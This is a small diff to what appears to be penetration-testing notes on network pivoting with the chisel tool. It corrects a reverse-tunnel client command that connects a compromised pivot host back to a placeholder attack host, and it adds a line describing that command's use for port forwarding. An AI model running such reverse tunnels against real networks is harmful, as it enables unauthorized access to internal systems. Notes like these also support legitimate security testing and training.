@@ -64,5 +64,7 @@ Run on the attack host. `--reverse` enables reverse tunnel mode, allowing the cl
 Run on the pivot host. Connects back to the attack host. `R:socks` instructs the server to listen on the default SOCKS port (`1080`) and proxy traffic through the pivot host's internal network.
 
 ```
-./chisel client -v <lhost:1234 R:8888:127.0.0.1:8888
+./chisel client -v <lhost>:1234 R:8888:127.0.0.1:8888
 ```
+
+Run on the pivot host. Connects back to the attack-host. Used for port forwarding.
